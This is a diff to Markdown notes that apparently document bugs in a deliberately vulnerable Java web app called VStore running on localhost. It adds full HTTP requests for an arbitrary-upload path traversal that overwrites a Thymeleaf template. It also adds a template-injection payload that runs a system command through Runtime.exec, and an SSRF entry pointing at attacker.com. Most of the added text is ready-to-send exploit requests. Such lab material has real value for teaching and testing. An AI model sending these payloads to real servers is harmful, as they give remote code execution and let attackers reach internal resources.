@@ -61,7 +61,63 @@
 - payload: id=4
 
 ### 5. POST "/upAVTVuln"
-- Bug: upload file avt tùy ý
+- Bug: upload file avt tùy ý dẫn tới RCE
 - params: image
-- payload: 
+- Payload: 
+```
+   POST /upAVT HTTP/1.1
+Host: localhost:8080
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCsWyqYFoOyp4thoH
+Cookie: JSESSIONID=69B4BBFF8707651A8E0F0D2D8E83DF3D
+Connection: close
+
+----WebKitFormBoundaryCsWyqYFoOyp4thoH
+Content-Disposition: form-data; name="image"; filename="../../templates/home.html"
+Content-Type: image/svg+xml
+
+<!DOCTYPE HTML>
+<html xmlns:th="http://www.thymeleaf.org">
+<head>
+    <title>VStore</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+</head>
+<body>
+<h1>Test PoC </h1>
+</body>
+</html>
+
+------WebKitFormBoundaryCsWyqYFoOyp4thoH--
+```
+- Payload RCE: 
+```
+   POST /upAVT HTTP/1.1
+Host: localhost:8080
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCsWyqYFoOyp4thoH
+Cookie: JSESSIONID=69B4BBFF8707651A8E0F0D2D8E83DF3D
+Connection: close
+
+----WebKitFormBoundaryCsWyqYFoOyp4thoH
+Content-Disposition: form-data; name="image"; filename="../../templates/home.html"
+Content-Type: image/svg+xml
+
+<!DOCTYPE HTML>
+<html xmlns:th="http://www.thymeleaf.org">
+<head>
+    <title>VStore</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+</head>
+<body>
+<h1>Test PoC RCE</h1>
+<p th:text="${T(java.lang.Runtime).getRuntime().exec('calc')}"/>
+</body>
+</html>
+
+------WebKitFormBoundaryCsWyqYFoOyp4thoH--
+```
+
+### 6. POST "/upAVTUrlVuln"
+- Bug: SSRF
+- Params: url
+- Payload: "HTTP://attacker.com/pic.png"
+   
    
